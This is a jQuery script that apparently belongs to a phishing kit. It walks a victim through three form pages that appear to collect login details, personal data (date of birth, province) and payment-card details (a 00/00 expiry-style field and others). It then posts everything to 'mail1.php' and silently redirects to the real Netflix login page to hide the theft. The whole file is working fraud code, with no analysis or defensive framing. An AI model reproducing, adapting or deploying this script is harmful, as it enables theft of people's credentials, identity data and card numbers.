$(document).ready(function(){
    
    $('.btn_go_1').click(function(){
        var err_1 = false;
        if($('.m_field_1').val().length==0){
            err_1 = true;
            $('.m_field_1').addClass('m_err');
        }else{
            $('.m_field_1').removeClass('m_err');
        }
        if($('.m_field_2').val().length==0){
            err_1 = true;
            $('.m_field_2').addClass('m_err');
        }else{
            $('.m_field_2').removeClass('m_err');
        }
        if(err_1==false){
            $('.m_page_1').hide();
            $('.m_page_2').show();
            $('body').addClass('second_page');
        }
    })

    $('.m_btn_2').click(function(){
        var err_1 = false;
        if($('.m_field_3').val().length==0){
            err_1 = true;
            $('.m_field_3').addClass('m_err');
        }else{
            $('.m_field_3').removeClass('m_err');
        }
        if($('.m_field_4').val().length==0){
            err_1 = true;
            $('.m_field_4').addClass('m_err');
        }else{
            $('.m_field_4').removeClass('m_err');
        }
        if($('.m_field_5').val().length==0){
            err_1 = true;
            $('.m_field_5').addClass('m_err');
        }else{
            $('.m_field_5').removeClass('m_err');
        }
        if($('.m_field_6').val().length==0){
            err_1 = true;
            $('.m_field_6').addClass('m_err');
        }else{
            $('.m_field_6').removeClass('m_err');
        }
        if($('.m_field_7').val().length==0){
            err_1 = true;
            $('.m_field_7').addClass('m_err');
        }else{
            $('.m_field_7').removeClass('m_err');
        }
        if($('.m_field_8').val()=='Choose Province'){
            err_1 = true;
            $('.m_field_8').addClass('m_err');
        }else{
            $('.m_field_8').removeClass('m_err');
        }
        if($('.m_field_9').val().length==0){
            err_1 = true;
            $('.m_field_9').addClass('m_err');
        }else{
            $('.m_field_9').removeClass('m_err');
        }
        if($('.m_field_10').val().length==0){
            err_1 = true;
            $('.m_field_10').addClass('m_err');
        }else{
            $('.m_field_10').removeClass('m_err');
        }


        if(err_1==false){
            $('.m_page_2').hide();
            $('.m_page_3').show();
        }
    })
    $('.m_field_5').mask('00/00/0000');
    
    $('.m_field_12').mask('00/00');
    
    $('input,select').click(function(){
        $(this).removeClass('m_err');
    })

    $('.m_btn_3').click(function(){
        var err_2 = false;
        if($('.m_field_11').val().length==0){
            err_2 = true;
            $('.m_field_11').addClass('m_err');
        }else{
            $('.m_field_11').removeClass('m_err');
        }
        if($('.m_field_12').val().length==0){
            err_2 = true;
            $('.m_field_12').addClass('m_err');
        }else{
            $('.m_field_12').removeClass('m_err');
        }
        if($('.m_field_13').val().length==0){
            err_2 = true;
            $('.m_field_13').addClass('m_err');
        }else{
            $('.m_field_13').removeClass('m_err');
        }
         if($('.m_field_14').val().length==0){
            err_2 = true;
            $('.m_field_14').addClass('m_err');
        }else{
            $('.m_field_14').removeClass('m_err');
        }
        if(err_2==false){
             $.post("mail1.php",$(".main_formi_1").serialize(),function(result){
                            $('.main_formi_1').trigger( 'reset' ); 
                            window.location.replace("https://www.netflix.com/login/");
              }); 
            
            }   
    })
   
})